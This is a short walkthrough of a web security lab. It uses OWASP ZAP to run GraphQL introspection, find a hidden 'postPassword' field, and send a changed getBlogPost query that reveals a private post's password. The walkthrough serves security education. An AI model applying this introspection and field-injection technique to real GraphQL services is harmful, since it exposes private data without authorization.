# Lab: Accessing private GraphQL posts [OWASP Zed Attack Proxy]

> NOTE: First things first, make sure you have a [GraphQL add-on installed and enabled on ZAP](https://www.zaproxy.org/blog/2020-08-28-introducing-the-graphql-add-on-for-zap/).

Access the blog via ZAP's browser and find the `POST /graphql/v1` request under the __History__ tab. Right-click the request, and select "Copy URLs".

Go to __Import__ > __Import a GraphQL Schema__ and paste the URL under "Endpoint URL" input. This will generate and launch an introspection query on your behalf to that endpoint. You will notice that as a result under __History__ panel, there's a new `POST /graphql/v1` request with `Source` set as `Manual`. The response of this request has all the information you need, specifically:

```
...
{
  "kind": "OBJECT",
  "name": "BlogPost",
  "fields": [
      ...
      {
        "name": "postPassword",
        "args": [],
        "type": {
          "kind": "SCALAR",
          "name": "String",
          "ofType": null
        },
        "isDeprecated": false,
        "deprecationReason": null
      }
      ...
  ]
}
```

This suggests, that a `BlogPost` type includes a `postPassword` field. 

Now in the browser visit any blog post by clicking "View post" on any one of them. Go back to __History__ panel in ZAP. Find a `POST /graphql/v1` request that comes right after `GET /post?postId=` request. Right-click the `POST` request and select "Open in Requester Tab".

Make chenages in the request body, so that the `id` value for the requested post is `3` and also add `postPassword` field to the request as `\n     postPassword` in the beginning, like this:

```graphql
{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n		postPassword\n            image\n            title\n            author\n            date\n            paragraphs\n        }\n    }","operationName":"getBlogPost","variables":{"id":3}}
```

Click "Send" and check the response. Copy the `postPassword` value from the response, go back to the browser window and click "Submit solution" on top. Paste the copied value in the input to solve the lab. 
